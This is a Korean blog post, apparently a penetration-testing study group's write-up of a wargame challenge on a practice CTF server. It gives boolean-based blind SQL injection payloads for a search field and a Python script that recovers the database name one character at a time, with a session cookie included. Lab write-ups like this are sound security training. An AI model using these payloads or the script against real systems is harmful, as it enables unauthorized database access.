---
layout: post
title:  노말틱 모의해킹 스터디 6주차 워게임 (7) 보안 커뮤니티
author: leewoojin
date: 2025-05-20 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---

### sqli 성공 여부 
sql%'and'1%'='1/ sq%'and'1%'='2 를 비교해보면 sqli 성공하는 것을 알수있습니다. 
```
[공격 페이로드 ]
sql%'and(공격문)and'1%'='1
```
### db명 추출 
sql%'and(ascii(substr((select+database()),1,1))>0)and'1%'='1

```python
import requests

URL = "http://ctf.segfaulthub.com:2984/spec5/search.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": "session=92baaf4d-3cc4-4f11-8b4e-4d9b50257a10.8Fga17H7VjUhtvLN4Hq3HbFF9sA; user_theme=dark"
}

def is_condition_true(position, ascii_code):
    payload = f"sql%'and ascii(substr((select database()),{position},1))={ascii_code} and'1%'='1"
    params = {"q": payload}
    response = requests.get(URL, params=params, headers=HEADERS)
    return len(response.text) > 100  # 정상 출력이면 조건이 참 (길이 기준)

def extract_database_name(max_length=20):
    result = ""
    print("[*] Extracting database name...")
    for i in range(1, max_length + 1):
        found = False
        for ascii_code in range(32, 127):  # Printable ASCII only
            if is_condition_true(i, ascii_code):
                result += chr(ascii_code)
                print(f"[+] Found char at position {i}: {chr(ascii_code)}")
                found = True
                break
        if not found:
            print(f"[!] No more characters found at position {i}. Terminating.")
            break
    return result

if __name__ == "__main__":
    db_name = extract_database_name()
    print(f"\n[✔] Extracted database name: {db_name}")
```